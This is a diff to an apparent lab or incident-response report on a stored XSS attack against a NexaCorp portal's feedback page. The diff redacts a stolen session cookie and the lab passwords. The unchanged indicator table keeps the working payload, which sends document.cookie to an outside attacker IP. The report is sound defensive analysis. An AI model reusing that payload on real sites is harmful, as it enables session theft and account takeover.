@@ -64,14 +64,14 @@ The injected script performed three actions in sequence:
 The beacon fired at 15:51:00 UTC. The exfiltrated value, recovered from the beacon URL and Base64-decoded, was:
 
 ```
-PHPSESSID=5e81c7a60ec649201724184a1996dae8
+PHPSESSID=[REDACTED]
 ```
 
 ### 3.4 The session reuse (impact)
 
 With the stolen `PHPSESSID`, the attacker replayed the session from external IP 91.92.100.45 and accessed the portal as p.dumont, with no password required. The login POST bodies captured in the network traffic also revealed an account that authenticated from the attacker IP and does not match any NexaCorp employee record: `m.renard`. The legitimate employee accounts observed were `t.lambert` and `p.dumont`.
 
-The status of `m.renard` warrants a precise statement of fact rather than a firm conclusion. What is proven: the account authenticated from the attacker IP, and it appears in no NexaCorp employee directory. Its password (`Renard2026!`) follows the same naming pattern as legitimate accounts (`Lambert2026!`), which leaves two hypotheses open. Either the attacker created this account inside the portal as a foothold, or it is a pre-existing account (for example a forgotten test account) that was compromised and reused. Both readings support the same action: the account must be treated as unauthorized, investigated, and removed. The investigation does not have sufficient evidence to assert which hypothesis is correct.
+The status of `m.renard` warrants a precise statement of fact rather than a firm conclusion. What is proven: the account authenticated from the attacker IP, and it appears in no NexaCorp employee directory. Its password (`[REDACTED-lab-credential]`) follows the same naming pattern as legitimate accounts (`[REDACTED-lab-credential]`), which leaves two hypotheses open. Either the attacker created this account inside the portal as a foothold, or it is a pre-existing account (for example a forgotten test account) that was compromised and reused. Both readings support the same action: the account must be treated as unauthorized, investigated, and removed. The investigation does not have sufficient evidence to assert which hypothesis is correct.
 
 A behavioral indicator reinforced attribution throughout: all attacker activity used a Firefox on Linux user agent, while the legitimate NexaCorp workstation fleet uses Chrome and Edge on Windows.
 
@@ -82,7 +82,7 @@ A behavioral indicator reinforced attribution throughout: all attacker activity 
 1. **External IP and port receiving outbound connections:** 91.92.100.45 on port 8080.
 2. **Page used to trigger the connections:** the feedback feature, `feedback.php`, abused through a stored XSS payload that beacons on page load.
 3. **Attack type and what was injected:** stored Cross-Site Scripting. The attacker injected a `<script>` tag that reads `document.cookie`, encodes it with `btoa`, and sends it to the collector.
-4. **Account targeted and data exfiltrated:** the targeted account was p.dumont. The exfiltrated data was the session cookie `PHPSESSID=5e81c7a60ec649201724184a1996dae8`.
+4. **Account targeted and data exfiltrated:** the targeted account was p.dumont. The exfiltrated data was the session cookie `PHPSESSID=[REDACTED]`.
 5. **Anomalous account:** `m.renard`, which authenticated from the attacker IP and matches no NexaCorp employee directory entry. Its origin is not fully established (attacker-created foothold, or compromised pre-existing account); in both cases it must be treated as unauthorized and removed.
 6. **Remediation:** see section 7.
 
@@ -100,7 +100,7 @@ A behavioral indicator reinforced attribution throughout: all attacker activity 
 | XSS payload | `<script>fetch('http://91.92.100.45:8080/collect?c='+btoa(document.cookie))</script>` |
 | Victim account | p.dumont |
 | Victim workstation | 192.168.10.110 |
-| Stolen session cookie | PHPSESSID=5e81c7a60ec649201724184a1996dae8 |
+| Stolen session cookie | PHPSESSID=[REDACTED] |
 | Unauthorized account | m.renard (origin undetermined, see 3.4) |
 | Attacker user agent | Mozilla/5.0 (X11; Linux x86_64) Firefox/115.0 |
 
@@ -127,7 +127,7 @@ A behavioral indicator reinforced attribution throughout: all attacker activity 
 
 2. **Harden session cookies.** Set the `HttpOnly` flag so that JavaScript cannot read `document.cookie`. With `HttpOnly` in place, the exact exfiltration used here would have failed even if the script executed. Add the `Secure` and `SameSite` attributes, and rotate session identifiers on authentication.
 
-3. **Invalidate the compromised session and remove the rogue account.** Force-expire `PHPSESSID=5e81c7a60ec649201724184a1996dae8`, reset p.dumont's credentials, and delete the unauthorized `m.renard` account. Audit the account directory for any other entries that do not map to a known employee.
+3. **Invalidate the compromised session and remove the rogue account.** Force-expire `PHPSESSID=[REDACTED]`, reset p.dumont's credentials, and delete the unauthorized `m.renard` account. Audit the account directory for any other entries that do not map to a known employee.
 
 4. **Add egress filtering and outbound monitoring.** The portal server should not be able to initiate, and clients should not be able to reach, arbitrary external hosts on non-standard ports such as 8080. Block and alert on outbound traffic to unrecognized destinations.
 
